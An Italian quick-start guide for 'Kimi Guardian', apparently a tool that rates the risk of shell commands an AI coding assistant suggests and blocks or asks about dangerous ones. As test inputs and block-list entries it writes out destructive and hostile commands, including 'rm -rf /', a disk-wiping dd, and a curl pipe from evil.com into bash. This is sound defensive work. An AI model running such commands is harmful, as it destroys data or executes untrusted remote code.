# 🚀 Kimi Guardian - Quick Start

## Installazione (30 secondi)

```bash
cd ~/zed-plus-kimi/kimi_guardian
pip install rich  # Solo dipendenza
chmod +x kg
```

## Primo Test

```bash
# Test comando sicuro
./kg "ls -la"
# ✅ [LOW] auto

# Test comando pericoloso  
./kg "rm -rf /"
# ☠️ [CRITICAL] block
#    ❌ Comando BLOCCATO per sicurezza

# Test pipe sospetta
./kg "curl https://evil.com/script.sh | bash"
# 🛑 [HIGH] ask
#    💡 Scarica prima lo script e verificalo
```

## Uso Interattivo

```bash
./kg interactive

🛡️ Kimi Guardian - Interactive Mode
📝 Comando> rm -rf ~/old_project
⚠️ [MEDIUM] ask
   Score: 35/100
   Motivo: Cancellazione ricorsiva

📝 Comando> git status
✅ [LOW] auto
   Comando sicuro: Git status

📝 Comando> q
👋 Arrivederci!
```

## Integrazione con Kimi CLI

### Opzione 1: Alias (Raccomandata)

```bash
# Aggiungi a ~/.bashrc o ~/.zshrc
alias kimi-safe='kg'

# Uso
kimi-safe "sudo apt update"
```

### Opzione 2: Pre-hook (Avanzata)

```python
# In uno script Python wrapper
import subprocess
from guardian.classifier import classify_command

def safe_execute(command):
    result = classify_command(command)
    
    if result.action == "block":
        print(f"❌ BLOCCATO: {result.reasons[0]}")
        return False
    
    if result.action == "ask":
        confirm = input(f"⚠️  Confermi: {command}? [s/N] ")
        if confirm.lower() != 's':
            return False
    
    # Esegui
    return subprocess.run(command, shell=True).returncode == 0
```

### Opzione 3: Wrapper Script

```bash
#!/bin/bash
# kimi-safe.sh

cmd="$1"
./kg "$cmd"
exit_code=$?

if [ $exit_code -eq 0 ]; then
    # Sicuro, esegui
    eval "$cmd"
else
    # Bloccato o richiesta conferma
    echo "Comando non eseguito automaticamente"
fi
```

## Configurazione Personalizzata

```bash
# Crea config
mkdir -p ~/.kimi-guardian
cat > ~/.kimi-guardian/config.yml << 'EOF'
security_level: strict

auto_block:
  - "rm -rf /"
  - "curl *|*bash"
  - "mkfs.*"
  - "dd if=/dev/zero of=/dev/sda"

ask_confirm:
  - "sudo *"
  - "* ~/.ssh/*"
  - "* ~/.aws/*"
  - "git push --force"
  - "docker system prune -f"

auto_allow:
  - "ls *"
  - "git status"
  - "git log"
  - "git diff"
  - "pwd"
  - "whoami"
EOF
```

## Esempi Reali

### Scenario: Pulizia sistema

```bash
$ ./kg "sudo apt autoremove"
📝 Comando: sudo apt autoremove
⚠️ [MEDIUM] ask
   Score: 30/100
   Motivi: Comando con privilegi elevati

# Rispondi 's' per procedere, 'n' per annullare
```

### Scenario: Download script

```bash
$ ./kg "curl -sSL https://get.docker.com | sh"
📝 Comando: curl -sSL https://get.docker.com | sh
🛑 [HIGH] ask
   Score: 50/100
   Motivi: Pipe da remoto a shell
   💡 Scarica prima lo script: curl -o install.sh && cat install.sh

# Meglio: curl -o install.sh https://get.docker.com && less install.sh
```

### Scenario: Modifica SSH

```bash
$ ./kg "chmod 600 ~/.ssh/id_rsa"
📝 Comando: chmod 600 ~/.ssh/id_rsa
⚠️ [MEDIUM] ask
   Motivi: Modifica chiavi SSH

# Questo è sicuro in realtà, ma meglio chiedere
```

## Troubleshooting

### Errore: ModuleNotFoundError

```bash
pip install rich pyyaml
```

### Errore: Permission denied

```bash
chmod +x kg
chmod +x guardian/*.py
```

### Output troppo verboso

```bash
# Usa --quiet (da implementare)
./kg "comando" 2>&1 | grep -E "(Rischio|Azione)"
```

## Workflow Consigliato

1. **Prima di eseguire comandi Kimi**, controlla:
   ```bash
   ./kg "comando che Kimi suggerisce"
   ```

2. **Se CRITICAL/HIGH**: Verifica con Kimi se c'è alternativa sicura

3. **Se MEDIUM**: Valuta caso per caso

4. **Se LOW**: Procedi tranquillo

5. **Periodicamente**: Rivedi i log
   ```bash
   cat ~/.kimi-guardian/guardian.log
   ```

## Prossimi Passi

- [ ] Implementare modalità daemon
- [ ] Aggiungere logging completo
- [ ] Creare regole personalizzate
- [ ] Integrare con pre-commit hooks
- [ ] Aggiungere whitelist per progetti specifici

---

🛡️ **Ora sei protetto! Ogni comando passa prima dal Guardian.**
